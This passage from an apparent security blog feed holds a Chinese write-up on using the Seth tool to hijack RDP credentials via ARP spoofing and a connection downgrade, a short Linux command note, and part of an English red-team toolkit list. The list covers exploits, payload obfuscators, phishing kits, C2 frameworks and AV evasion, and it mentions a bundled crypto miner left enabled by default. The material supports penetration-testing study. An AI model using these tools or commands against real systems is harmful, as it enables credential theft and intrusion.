href="https://github.com/danielhnmoreno/pyJoiner---GUI-Version">https://github.com/danielhnmoreno/pyJoiner---GUI-Version</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
            <tag> payloads </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过降级连接劫持RDP明文凭据</title>
      <link href="/2021/06/08/seth.htm"/>
      <url>/2021/06/08/seth.htm</url>
      
        <content type="html"><![CDATA[<blockquote><p>Seth是一种用Python和Bash编写的工具，用于通过尝试降级连接以提取明文凭据来进行MitM RDP连接。它的开发目的是为了提高认识，并在笔试，讲习班或会谈的背景下教育正确配置的RDP连接的重要性。作者是Adrian Vollmer（SySS GmbH）。</p></blockquote><span id="more"></span><h2 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h2><pre class="line-numbers language-sh"><code class="language-sh">$ ./seth.sh <INTERFACE> <ATTACKER IP> <VICTIM IP> <GATEWAY IP|HOST IP> [<COMMAND>]实例：./seth.sh 网口 攻击者IP 访问RDP IP 被攻击者IP <命令执行一般不用>./seth.sh eth0 192.168.3.149 192.168.3.150 192.168.3.138与上面命令等价（如果所有机器在同一网段可用）：./seth.sh eth0 192.168.3.&#123;149,150,138&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h2><ul><li>项目地址：<a href="https://github.com/SySS-Research/Seth">Seth</a></li></ul><ul><li>攻击者机器：kali 192.168.3.149</li><li>访问RDP机器：win 7 x64 192.168.3.150</li><li>被攻击者机器：win 10 x64 192.168.3.138</li></ul><blockquote><ol><li>欺骗ARP回复</li><li>启用IPv4流量转发，将流量从受害主机重定向到攻击者机器，然后再转发到目标RDP服务器。</li><li>配置一个iptable规则拒绝SYN数据包，以防止直接的RDP认证。</li><li>捕获目标主机的SYN数据包。</li><li>克隆SSL证书。<br>重新配置iptables规则，以将流量从受害工作站路由到目标RDP主机。</li><li>阻止到端口88的流量，以将Kerberos身份验证降级到NTLM。</li></ol></blockquote><ul><li>seth 执行完的界面：</li></ul><p><img src="/uploads/start.jpg"></p><ul><li>访问RDP的机器弹出，尝试通过RDP向目标服务器进行身份验证的用户将会收到以下消息：</li></ul><p><img src="/uploads/ssl.jpg"></p><ul><li>成功获取被攻击者RDP的用户名密码：</li></ul><p><img src="/uploads/mm.jpg"></p><ul><li><p>当以下复选框未选中时被攻击者可以直接登录系统，并且seth可以进行键盘记录。</p><p><img src="/uploads/ms.jpg"></p></li></ul><h2 id="备注："><a href="#备注：" class="headerlink" title="备注："></a>备注：</h2><ul><li>当我使用win 10 做为访问攻击目标RDP的机器时，win 10 直接报错 ，攻击机器显示类似“请确认加密方式是不是xxx”，不能抓到密码（也可能是我环境的问题）。</li><li>使用win 7 做为访问攻击目标RDP的机器，弹出ssl认证那个，未报错，只是进不去mstsc，重新登录即可（攻击机已经断开监听所以可以正常登录）。</li><li>使用win 8 做为访问攻击目标RDP的机器，弹出ssl认证那个，报错（但是不影响，点击重新登录即可登录成功）。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
          <category> RDP攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RDP </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux 常用命令</title>
      <link href="/2021/06/08/linux-command.htm"/>
      <url>/2021/06/08/linux-command.htm</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-常用命令操作"><a href="#Linux-常用命令操作" class="headerlink" title="Linux 常用命令操作"></a>Linux 常用命令操作</h1><blockquote><p>温故而知新</p></blockquote><span id="more"></span><pre class="line-numbers language-linu"><code class="language-linu">kill -9 `ps -ef|grep apache2|grep -v grep|awk '&#123;print $2&#125;' `指定进程名执行 kill命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/uploads/linux1.png" alt="1"></p><p><img src="/uploads/linux2.png" alt="2"></p><p><img src="/uploads/linux3.png" alt="3"></p><p><img src="/uploads/linux4.png" alt="4"></p><p><img src="/uploads/linux5.png" alt="5"></p><p><img src="/uploads/linux6.png" alt="6"></p><p><img src="/uploads/linux7.png" alt="7"></p><p><img src="/uploads/linux8.png" alt="8"></p><p><img src="/uploads/linux9.png" alt="9"></p><p><img src="/uploads/linux10.png" alt="10"></p><p><img src="/uploads/linux11.png" alt="11"></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redteam Toolkit</title>
      <link href="/2021/06/08/redteam-toolkit.htm"/>
      <url>/2021/06/08/redteam-toolkit.htm</url>
      
        <content type="html"><![CDATA[<p><img src="/uploads/bBQ9aKm.png" alt="alt text"></p><span id="more"></span><p>This tool kit is very much influenced by infosecn1nja’s kit.<br>Use this script to grab majority of the repos.</p><p><strong>NOTE: hard coded in /opt and made for Kali Linux</strong></p><p><strong>Total Size (so far): 2.5+Gb</strong></p><p>Install Guide:</p><pre><code>git clone https://github.com/shr3ddersec/Shr3dKit.gitpip install -r requirements.txtbash shr3dkit.sh</code></pre><p><strong>Change Log</strong></p><pre><code>Fixed: macro_pack, LaZagneCode: Added all requirements to script, seperated pip requirements and merged to one file.Tools Added: Modlishka, pwndb, cat-sites, Phantom-Evasion</code></pre><p><strong>Phantom Evasion Forewarning</strong></p><p>Currently pursuing a permanent an IT Sec role, for personal budgeting I added this tool as does a fantastic job for AV Evasion without opening up your wallet. <em>Keep in mind, this does have crypto miner (xmr-stak) installer option. I kept the complete install out of script purposely for this reason</em>. To disable, please change <code>Miner=False</code> in Setup/Config.txt then run the script. You may always keep it on to help the devs, such as myself in my home lab.</p><h2 id="Contents"><a href="#Contents" class="headerlink" title="Contents"></a>Contents</h2><ul><li><a href="#reconnaissance">Reconnaissance</a></li><li><a href="#weaponization">Weaponization</a></li><li><a href="#delivery">Delivery</a></li><li><a href="#command-and-control">Command and Control</a></li><li><a href="#lateral-movement">Lateral Movement</a></li><li><a href="#establish-foothold">Establish Foothold</a></li><li><a href="#escalate-privileges">Escalate Privileges</a></li><li><a href="#data-exfiltration">Data Exfiltration</a></li><li><a href="#misc">Misc</a></li><li><a href="#references">References</a></li></ul><h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><h3 id="Active-Intelligence-Gathering"><a href="#Active-Intelligence-Gathering" class="headerlink" title="Active Intelligence Gathering"></a>Active Intelligence Gathering</h3><ul><li><strong>EyeWitness</strong> is designed to take screenshots of websites, provide some server header info, and identify default credentials if possible. <a href="https://github.com/ChrisTruncer/EyeWitness">https://github.com/ChrisTruncer/EyeWitness</a></li><li><strong>AWSBucketDump</strong> is a tool to quickly enumerate AWS S3 buckets to look for loot. <a href="https://github.com/jordanpotti/AWSBucketDump">https://github.com/jordanpotti/AWSBucketDump</a></li><li><strong>AQUATONE</strong> is a set of tools for performing reconnaissance on domain names. <a href="https://github.com/michenriksen/aquatone">https://github.com/michenriksen/aquatone</a></li><li><strong>spoofcheck</strong> a program that checks if a domain can be spoofed from. The program checks SPF and DMARC records for weak configurations that allow spoofing. <a href="https://github.com/BishopFox/spoofcheck">https://github.com/BishopFox/spoofcheck</a></li><li><strong>Nmap</strong> is used to discover hosts and services on a computer network, thus building a “map” of the network. <a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a></li><li><strong>dnsrecon</strong> a tool DNS Enumeration Script. <a href="https://github.com/darkoperator/dnsrecon">https://github.com/darkoperator/dnsrecon</a></li></ul><h3 id="Passive-Intelligence-Gathering"><a href="#Passive-Intelligence-Gathering" class="headerlink" title="Passive Intelligence Gathering"></a>Passive Intelligence Gathering</h3><ul><li><p><strong>Social Mapper</strong> OSINT Social Media Mapping Tool, takes a list of names &amp; images (or LinkedIn company name) and performs automated target searching on a huge scale across multiple social media sites. Not restricted by APIs as it instruments a browser using Selenium. Outputs reports to aid in correlating targets across sites. <a href="https://github.com/SpiderLabs/social_mapper">https://github.com/SpiderLabs/social_mapper</a></p></li><li><p><strong>skiptracer</strong> OSINT scraping framework, utilizes some basic python webscraping (BeautifulSoup) of PII paywall sites to compile passive information on a target on a ramen noodle budget. <a href="https://github.com/xillwillx/skiptracer">https://github.com/xillwillx/skiptracer</a></p></li><li><p><strong>ScrapedIn</strong> a tool to scrape LinkedIn without API restrictions for data reconnaissance. <a href="https://github.com/dchrastil/ScrapedIn">https://github.com/dchrastil/ScrapedIn</a></p></li><li><p><strong>linkScrape</strong> A LinkedIn user/company enumeration tool. <a href="https://github.com/NickSanzotta/linkScrape">https://github.com/NickSanzotta/linkScrape</a></p></li><li><p><strong>FOCA</strong> (Fingerprinting Organizations with Collected Archives) is a tool used mainly to find metadata and hidden information in the documents its scans. <a href="https://github.com/ElevenPaths/FOCA">https://github.com/ElevenPaths/FOCA</a></p></li><li><p><strong>theHarvester</strong> is a tool for gathering subdomain names, e-mail addresses, virtual<br>hosts, open ports/ banners, and employee names from different public sources. <a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a></p></li><li><p><strong>Metagoofil</strong> is a tool for extracting metadata of public documents (pdf,doc,xls,ppt,etc) availables in the target websites. <a href="https://github.com/laramies/metagoofil">https://github.com/laramies/metagoofil</a></p></li><li><p><strong>SimplyEmail</strong> Email recon made fast and easy, with a framework to build on. <a href="https://github.com/killswitch-GUI/SimplyEmail">https://github.com/killswitch-GUI/SimplyEmail</a></p></li><li><p><strong>truffleHog</strong> searches through git repositories for secrets, digging deep into commit history and branches.  <a href="https://github.com/dxa4481/truffleHog">https://github.com/dxa4481/truffleHog</a></p></li><li><p><strong>Just-Metadata</strong> is a tool that gathers and analyzes metadata about IP addresses. It attempts to find relationships between systems within a large dataset. <a href="https://github.com/ChrisTruncer/Just-Metadata">https://github.com/ChrisTruncer/Just-Metadata</a></p></li><li><p><strong>typofinder</strong> a finder of domain typos showing country of IP address. <a href="https://github.com/nccgroup/typofinder">https://github.com/nccgroup/typofinder</a></p></li><li><p><strong>pwnedOrNot</strong> is a python script which checks if the email account has been compromised in a data breach, if the email account is compromised it proceeds to find passwords for the compromised account. <a href="https://github.com/thewhiteh4t/pwnedOrNot">https://github.com/thewhiteh4t/pwnedOrNot</a></p></li><li><p><strong>GitHarvester</strong> This tool is used for harvesting information from GitHub like google dork. <a href="https://github.com/metac0rtex/GitHarvester">https://github.com/metac0rtex/GitHarvester</a></p></li><li><p><strong>pwndb</strong> is a python command-line tool for searching leaked credentials using the Onion service with the same name. <a href="https://github.com/davidtavarez/pwndb/">https://github.com/davidtavarez/pwndb/</a></p></li></ul><h3 id="Frameworks"><a href="#Frameworks" class="headerlink" title="Frameworks"></a>Frameworks</h3><ul><li><strong>Maltego</strong> is a unique platform developed to deliver a clear threat picture to the environment that an organization owns and operates. <a href="https://www.paterva.com/web7/downloads.php">https://www.paterva.com/web7/downloads.php</a></li><li><strong>SpiderFoot</strong> the open source footprinting and intelligence-gathering tool. <a href="https://github.com/smicallef/spiderfoot">https://github.com/smicallef/spiderfoot</a></li><li><strong>datasploit</strong> is an OSINT Framework to perform various recon techniques on Companies, People, Phone Number, Bitcoin Addresses, etc., aggregate all the raw data, and give data in multiple formats. <a href="https://github.com/DataSploit/datasploit">https://github.com/DataSploit/datasploit</a></li><li><strong>Recon-ng</strong> is a full-featured Web Reconnaissance framework written in Python. <a href="https://bitbucket.org/LaNMaSteR53/recon-ng">https://bitbucket.org/LaNMaSteR53/recon-ng</a></li></ul><h2 id="Weaponization"><a href="#Weaponization" class="headerlink" title="Weaponization"></a>Weaponization</h2><ul><li><strong>Composite Moniker</strong> Proof of Concept exploit for CVE-2017-8570. <a href="https://github.com/rxwx/CVE-2017-8570">https://github.com/rxwx/CVE-2017-8570</a></li><li><strong>Exploit toolkit CVE-2017-8759</strong> is a handy python script which provides pentesters and security researchers a quick and effective way to test Microsoft .NET Framework RCE. <a href="https://github.com/bhdresh/CVE-2017-8759">https://github.com/bhdresh/CVE-2017-8759</a></li><li><strong>CVE-2017-11882 Exploit</strong> accepts over 17k bytes long command/code in maximum. <a href="https://github.com/unamer/CVE-2017-11882">https://github.com/unamer/CVE-2017-11882</a></li><li><strong>Adobe Flash Exploit</strong> CVE-2018-4878. <a href="https://github.com/anbai-inc/CVE-2018-4878">https://github.com/anbai-inc/CVE-2018-4878</a></li><li><strong>Exploit toolkit CVE-2017-0199</strong> is a handy python script which provides pentesters and security researchers a quick and effective way to test Microsoft Office RCE. <a href="https://github.com/bhdresh/CVE-2017-0199">https://github.com/bhdresh/CVE-2017-0199</a></li><li><strong>demiguise</strong> is a HTA encryption tool for RedTeams. <a href="https://github.com/nccgroup/demiguise">https://github.com/nccgroup/demiguise</a></li><li><strong>Office-DDE-Payloads</strong> collection of scripts and templates to generate Office documents embedded with the DDE, macro-less command execution technique. <a href="https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads">https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads</a></li><li><strong>CACTUSTORCH</strong> Payload Generation for Adversary Simulations. <a href="https://github.com/mdsecactivebreach/CACTUSTORCH">https://github.com/mdsecactivebreach/CACTUSTORCH</a></li><li><strong>SharpShooter</strong> is a payload creation framework for the retrieval and execution of arbitrary CSharp source code. <a href="https://github.com/mdsecactivebreach/SharpShooter">https://github.com/mdsecactivebreach/SharpShooter</a></li><li><strong>Don’t kill my cat</strong> is a tool that generates obfuscated shellcode that is stored inside of polyglot images. The image is 100% valid and also 100% valid shellcode. <a href="https://github.com/Mr-Un1k0d3r/DKMC">https://github.com/Mr-Un1k0d3r/DKMC</a></li><li><strong>Malicious Macro Generator Utility</strong> Simple utility design to generate obfuscated macro that also include a AV / Sandboxes escape mechanism. <a href="https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator">https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator</a></li><li><strong>SCT Obfuscator</strong> Cobalt Strike SCT payload obfuscator. <a href="https://github.com/Mr-Un1k0d3r/SCT-obfuscator">https://github.com/Mr-Un1k0d3r/SCT-obfuscator</a></li><li><strong>Invoke-Obfuscation</strong> PowerShell Obfuscator. <a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></li><li><strong>Invoke-DOSfuscation</strong> cmd.exe Command Obfuscation Generator &amp; Detection Test Harness. <a href="https://github.com/danielbohannon/Invoke-DOSfuscation">https://github.com/danielbohannon/Invoke-DOSfuscation</a></li><li><strong>morphHTA</strong> Morphing Cobalt Strike’s evil.HTA. <a href="https://github.com/vysec/morphHTA">https://github.com/vysec/morphHTA</a></li><li><strong>Unicorn</strong> is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory. <a href="https://github.com/trustedsec/unicorn">https://github.com/trustedsec/unicorn</a></li><li><strong>Shellter</strong> is a dynamic shellcode injection tool, and the first truly dynamic PE infector ever created. <a href="https://www.shellterproject.com/">https://www.shellterproject.com/</a></li><li><strong>EmbedInHTML</strong> Embed and hide any file in an HTML file. <a href="https://github.com/Arno0x/EmbedInHTML">https://github.com/Arno0x/EmbedInHTML</a></li><li><strong>SigThief</strong> Stealing Signatures and Making One Invalid Signature at a Time. <a href="https://github.com/secretsquirrel/SigThief">https://github.com/secretsquirrel/SigThief</a></li><li><strong>Veil</strong> is a tool designed to generate metasploit payloads that bypass common anti-virus solutions. <a href="https://github.com/Veil-Framework/Veil">https://github.com/Veil-Framework/Veil</a></li><li><strong>CheckPlease</strong> Sandbox evasion modules written in PowerShell, Python, Go, Ruby, C, C#, Perl, and Rust. <a href="https://github.com/Arvanaghi/CheckPlease">https://github.com/Arvanaghi/CheckPlease</a></li><li><strong>Invoke-PSImage</strong> is a tool to embeded a PowerShell script in the pixels of a PNG file and generates a oneliner to execute. <a href="https://github.com/peewpw/Invoke-PSImage">https://github.com/peewpw/Invoke-PSImage</a></li><li><strong>LuckyStrike</strong> a PowerShell based utility for the creation of malicious Office macro documents. To be used for pentesting or educational purposes only. <a href="https://github.com/curi0usJack/luckystrike">https://github.com/curi0usJack/luckystrike</a></li><li><strong>ClickOnceGenerator</strong> Quick Malicious ClickOnceGenerator for Red Team. The default application a simple WebBrowser widget that point to a website of your choice. <a href="https://github.com/Mr-Un1k0d3r/ClickOnceGenerator">https://github.com/Mr-Un1k0d3r/ClickOnceGenerator</a></li><li><strong>macro_pack</strong> is a tool by @EmericNasi used to automatize obfuscation and generation of MS Office documents, VB scripts, and other formats for pentest, demo, and social engineering assessments. <a href="https://github.com/sevagas/macro_pack">https://github.com/sevagas/macro_pack</a></li><li><strong>StarFighters</strong> a JavaScript and VBScript Based Empire Launcher. <a href="https://github.com/Cn33liz/StarFighters">https://github.com/Cn33liz/StarFighters</a></li><li><strong>nps_payload</strong> this script will generate payloads for basic intrusion detection avoidance. It utilizes publicly demonstrated techniques from several different sources. <a href="https://github.com/trustedsec/nps_payload">https://github.com/trustedsec/nps_payload</a></li><li><strong>SocialEngineeringPayloads</strong> a collection of social engineering tricks and payloads being used for credential theft and spear phishing attacks. <a href="https://github.com/bhdresh/SocialEngineeringPayloads">https://github.com/bhdresh/SocialEngineeringPayloads</a></li><li><strong>The Social-Engineer Toolkit</strong> is an open-source penetration testing framework designed for social engineering. <a href="https://github.com/trustedsec/social-engineer-toolkit">https://github.com/trustedsec/social-engineer-toolkit</a></li><li><strong>Phishery</strong> is a Simple SSL Enabled HTTP server with the primary purpose of phishing credentials via Basic Authentication.  <a href="https://github.com/ryhanson/phishery">https://github.com/ryhanson/phishery</a></li><li><strong>PowerShdll</strong> run PowerShell with rundll32. Bypass software restrictions. <a href="https://github.com/p3nt4/PowerShdll">https://github.com/p3nt4/PowerShdll</a></li><li><strong>Ultimate AppLocker ByPass List</strong> The goal of this repository is to document the most common techniques to bypass AppLocker. <a href="https://github.com/api0cradle/UltimateAppLockerByPassList">https://github.com/api0cradle/UltimateAppLockerByPassList</a></li><li><strong>Ruler</strong> is a tool that allows you to interact with Exchange servers remotely, through either the MAPI/HTTP or RPC/HTTP protocol. <a href="https://github.com/sensepost/ruler">https://github.com/sensepost/ruler</a></li><li><strong>Generate-Macro</strong> is a standalone PowerShell script that will generate a malicious Microsoft Office document with a specified payload and persistence method. <a href="https://github.com/enigma0x3/Generate-Macro">https://github.com/enigma0x3/Generate-Macro</a></li><li><strong>Malicious Macro MSBuild Generator</strong> Generates Malicious Macro and Execute Powershell or Shellcode via MSBuild Application Whitelisting Bypass. <a href="https://github.com/infosecn1nja/MaliciousMacroMSBuild">https://github.com/infosecn1nja/MaliciousMacroMSBuild</a></li><li><strong>Meta Twin</strong> is designed as a file resource cloner. Metadata, including digital signature, is extracted from one file and injected into another. <a href="https://github.com/threatexpress/metatwin">https://github.com/threatexpress/metatwin</a></li><li><strong>WePWNise</strong> generates architecture independent VBA code to be used in Office documents or templates and automates bypassing application control and exploit mitigation software. <a href="https://github.com/mwrlabs/wePWNise">https://github.com/mwrlabs/wePWNise</a></li><li><strong>DotNetToJScript</strong> a tool to create a JScript file which loads a .NET v2 assembly from memory. <a href="https://github.com/tyranid/DotNetToJScript">https://github.com/tyranid/DotNetToJScript</a></li><li><strong>PSAmsi</strong> is a tool for auditing and defeating AMSI signatures. <a href="https://github.com/cobbr/PSAmsi">https://github.com/cobbr/PSAmsi</a></li><li><strong>Reflective DLL injection</strong> is a library injection technique in which the concept of reflective programming is employed to perform the loading of a library from memory into a host process. <a href="https://github.com/stephenfewer/ReflectiveDLLInjection">https://github.com/stephenfewer/ReflectiveDLLInjection</a></li><li><strong>ps1encode</strong> use to generate and encode a powershell based metasploit payloads. <a href="https://github.com/CroweCybersecurity/ps1encode">https://github.com/CroweCybersecurity/ps1encode</a></li><li><strong>Worse PDF</strong> turn a normal PDF file into malicious. Use to steal Net-NTLM Hashes from windows machines. <a href="https://github.com/3gstudent/Worse-PDF">https://github.com/3gstudent/Worse-PDF</a></li><li><strong>SpookFlare</strong> has a different perspective to bypass security measures and it gives you the opportunity to bypass the endpoint countermeasures at the client-side detection and network-side detection. <a href="https://github.com/hlldz/SpookFlare">https://github.com/hlldz/SpookFlare</a></li><li><strong>GreatSCT</strong> is an open source project to generate application white list bypasses. This tool is intended for BOTH red and blue team. <a href="https://github.com/GreatSCT/GreatSCT">https://github.com/GreatSCT/GreatSCT</a></li><li><strong>nps</strong> running powershell without powershell. <a href="https://github.com/Ben0xA/nps">https://github.com/Ben0xA/nps</a></li><li><strong>Meterpreter_Paranoid_Mode.sh</strong> allows users to secure your staged/stageless connection for Meterpreter by having it check the certificate of the handler it is connecting to. <a href="https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL">https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL</a></li><li><strong>The Backdoor Factory (BDF)</strong> is to patch executable binaries with user desired shellcode and continue normal execution of the prepatched state. <a href="https://github.com/secretsquirrel/the-backdoor-factory">https://github.com/secretsquirrel/the-backdoor-factory</a></li><li><strong>MacroShop</strong> a collection of scripts to aid in delivering payloads via Office Macros. <a href="https://github.com/khr0x40sh/MacroShop">https://github.com/khr0x40sh/MacroShop</a></li><li><strong>UnmanagedPowerShell</strong> Executes PowerShell from an unmanaged process. <a href="https://github.com/leechristensen/UnmanagedPowerShell">https://github.com/leechristensen/UnmanagedPowerShell</a></li><li><strong>evil-ssdp</strong> Spoof SSDP replies to phish for NTLM hashes on a network. Creates a fake UPNP device, tricking users into visiting a malicious phishing page. <a href="https://gitlab.com/initstring/evil-ssdp">https://gitlab.com/initstring/evil-ssdp</a></li><li><strong>Ebowla</strong> Framework for Making Environmental Keyed Payloads. <a href="https://github.com/Genetic-Malware/Ebowla">https://github.com/Genetic-Malware/Ebowla</a></li><li><strong>make-pdf-embedded</strong> a tool to create a PDF document with an embedded file. <a href="https://github.com/DidierStevens/DidierStevensSuite/blob/master/make-pdf-embedded.py">https://github.com/DidierStevens/DidierStevensSuite/blob/master/make-pdf-embedded.py</a></li><li><strong>avet</strong> (AntiVirusEvasionTool) is targeting windows machines with executable files using different evasion techniques. <a href="https://github.com/govolution/avet">https://github.com/govolution/avet</a></li><li><strong>Phantom-Evasion</strong> Interactive antivirus evasion tool written in python capable to generate (almost) FUD executable even with the most common 32 bit msfvenom payload (lower detection ratio with 64 bit payloads). <a href="https://github.com/oddcod3/Phantom-Evasion">https://github.com/oddcod3/Phantom-Evasion</a> <strong>WARNING</strong>: Please be aware this does install a Minero miner by default. This can be changed in the <strong>Setup</strong> folder and edit <strong>Config.txt</strong> and edit <em>Mining = False</em>. If you want to support the project and developers, I would recommend keeping on. </li></ul><h2 id="Delivery"><a href="#Delivery" class="headerlink" title="Delivery"></a>Delivery</h2><h3 id="Phishing"><a href="#Phishing" class="headerlink" title="Phishing"></a>Phishing</h3><ul><li><strong>King Phisher</strong> is a tool for testing and promoting user awareness by simulating real world phishing attacks. <a href="https://github.com/securestate/king-phisher">https://github.com/securestate/king-phisher</a></li><li><strong>FiercePhish</strong> is a full-fledged phishing framework to manage all phishing engagements. It allows you to track separate phishing campaigns, schedule sending of emails, and much more. <a href="https://github.com/Raikia/FiercePhish">https://github.com/Raikia/FiercePhish</a></li><li><strong>ReelPhish</strong> is a Real-Time Two-Factor Phishing Tool. <a href="https://github.com/fireeye/ReelPhish/">https://github.com/fireeye/ReelPhish/</a></li><li><strong>Gophish</strong> is an open-source phishing toolkit designed for businesses and penetration testers. It provides the ability to quickly and easily setup and execute phishing engagements and security awareness training. <a href="https://github.com/gophish/gophish">https://github.com/gophish/gophish</a></li><li><strong>CredSniper</strong> is a phishing framework written with the Python micro-framework Flask and Jinja2 templating which supports capturing 2FA tokens. <a href="https://github.com/ustayready/CredSniper">https://github.com/ustayready/CredSniper</a></li><li><strong>PwnAuth</strong> a web application framework for launching and managing OAuth abuse campaigns. <a href="https://github.com/fireeye/PwnAuth">https://github.com/fireeye/PwnAuth</a></li><li><strong>Phishing Frenzy</strong> Ruby on Rails Phishing Framework. <a href="https://github.com/pentestgeek/phishing-frenzy">https://github.com/pentestgeek/phishing-frenzy</a></li><li><strong>Phishing Pretexts</strong> a library of pretexts to use on offensive phishing engagements. <a href="https://github.com/L4bF0x/PhishingPretexts">https://github.com/L4bF0x/PhishingPretexts</a></li><li><strong>Modlishka</strong> is a flexible and powerful reverse proxy, that will take your ethical phishing campaigns to the next level. <a href="https://github.com/drk1wi/Modlishka">https://github.com/drk1wi/Modlishka</a></li></ul><h3 id="Watering-Hole-Attack"><a href="#Watering-Hole-Attack" class="headerlink" title="Watering Hole Attack"></a>Watering Hole Attack</h3><ul><li><strong>BeEF</strong> is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser. <a href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a></li></ul><h2 id="Command-and-Control"><a href="#Command-and-Control" class="headerlink" title="Command and Control"></a>Command and Control</h2><h3 id="Remote-Access-Tools"><a href="#Remote-Access-Tools" class="headerlink" title="Remote Access Tools"></a>Remote Access Tools</h3><ul><li><strong>Cobalt Strike</strong> is software for Adversary Simulations and Red Team Operations. <a href="https://cobaltstrike.com/">https://cobaltstrike.com/</a></li><li><strong>Empire</strong> is a post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent. <a href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a></li><li><strong>Metasploit Framework</strong> is a computer security project that provides information about security vulnerabilities and aids in penetration testing and IDS signature development. <a href="https://github.com/rapid7/metasploit-framework">https://github.com/rapid7/metasploit-framework</a></li><li><strong>SILENTTRINITY</strong> A post-exploitation agent powered by Python, IronPython, C#/.NET. <a href="https://github.com/byt3bl33d3r/SILENTTRINITY">https://github.com/byt3bl33d3r/SILENTTRINITY</a></li><li><strong>Pupy</strong> is an opensource, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool mainly written in python. <a href="https://github.com/n1nj4sec/pupy">https://github.com/n1nj4sec/pupy</a></li><li><strong>Koadic</strong> or COM Command &amp; Control, is a Windows post-exploitation rootkit similar to other penetration testing tools such as Meterpreter and Powershell Empire. <a href="https://github.com/zerosum0x0/koadic">https://github.com/zerosum0x0/koadic</a></li><li><strong>PoshC2</strong> is a proxy aware C2 framework written completely in PowerShell to aid penetration testers with red teaming, post-exploitation and lateral movement. <a href="https://github.com/nettitude/PoshC2">https://github.com/nettitude/PoshC2</a></li><li><strong>Gcat</strong> a stealthy Python based backdoor that uses Gmail as a command and control server. <a href="https://github.com/byt3bl33d3r/gcat">https://github.com/byt3bl33d3r/gcat</a></li><li><strong>TrevorC2</strong> is a legitimate website (browsable) that tunnels client/server communications for covert command execution. <a href="https://github.com/trustedsec/trevorc2">https://github.com/trustedsec/trevorc2</a></li><li><strong>Merlin</strong> is a cross-platform post-exploitation HTTP/2 Command &amp; Control server and agent written in golang. <a href="https://github.com/Ne0nd0g/merlin">https://github.com/Ne0nd0g/merlin</a></li><li><strong>Quasar</strong> is a fast and light-weight remote administration tool coded in C#. Providing high stability and an easy-to-use user interface, Quasar is the perfect remote administration solution for you. <a href="https://github.com/quasar/QuasarRAT">https://github.com/quasar/QuasarRAT</a></li></ul><h3 id="Staging"><a href="#Staging" class="headerlink" title="Staging"></a>Staging</h3><ul><li><strong>Rapid Attack Infrastructure (RAI)</strong> Red Team Infrastructure… Quick… Fast… Simplified<br>One of the most tedious phases of a Red Team Operation is usually the infrastructure setup. This usually entails<br>a teamserver or controller, domains, redirectors, and a Phishing server. <a href="https://github.com/obscuritylabs/RAI">https://github.com/obscuritylabs/RAI</a></li><li><strong>Red Baron</strong> is a set of modules and custom/third-party providers for Terraform which tries to automate creating resilient, disposable, secure and agile infrastructure for Red Teams. <a href="https://github.com/byt3bl33d3r/Red-Baron">https://github.com/byt3bl33d3r/Red-Baron</a></li><li><strong>EvilURL</strong> generate unicode evil domains for IDN Homograph Attack and detect them. <a href="https://github.com/UndeadSec/EvilURL">https://github.com/UndeadSec/EvilURL</a></li><li><strong>Domain Hunter</strong> checks expired domains, bluecoat categorization, and Archive.org history to determine good candidates for phishing and C2 domain names. <a href="https://github.com/threatexpress/domainhunter">https://github.com/threatexpress/domainhunter</a></li><li><strong>PowerDNS</strong> is a simple proof of concept to demonstrate the execution of PowerShell script using DNS only. <a href="https://github.com/mdsecactivebreach/PowerDNS">https://github.com/mdsecactivebreach/PowerDNS</a></li><li><strong>Chameleon</strong> a tool for evading Proxy categorisation. <a href="https://github.com/mdsecactivebreach/Chameleon">https://github.com/mdsecactivebreach/Chameleon</a></li><li><strong>CatMyFish</strong> Search for categorized domain that can be used during red teaming engagement. Perfect to setup whitelisted domain for your Cobalt Strike beacon C&amp;C. <a href="https://github.com/Mr-Un1k0d3r/CatMyFish">https://github.com/Mr-Un1k0d3r/CatMyFish</a></li><li><strong>Malleable C2</strong> is a domain specific language to redefine indicators in Beacon’s communication. <a href="https://github.com/rsmudge/Malleable-C2-Profiles">https://github.com/rsmudge/Malleable-C2-Profiles</a></li><li><strong>Malleable-C2-Randomizer</strong> This script randomizes Cobalt Strike Malleable C2 profiles through the use of a metalanguage, hopefully reducing the chances of flagging signature-based detection controls. <a href="https://github.com/bluscreenofjeff/Malleable-C2-Randomizer">https://github.com/bluscreenofjeff/Malleable-C2-Randomizer</a></li><li><strong>FindFrontableDomains</strong> search for potential frontable domains. <a href="https://github.com/rvrsh3ll/FindFrontableDomains">https://github.com/rvrsh3ll/FindFrontableDomains</a></li><li><strong>Postfix-Server-Setup</strong> Setting up a phishing server is a very long and tedious process. It can take 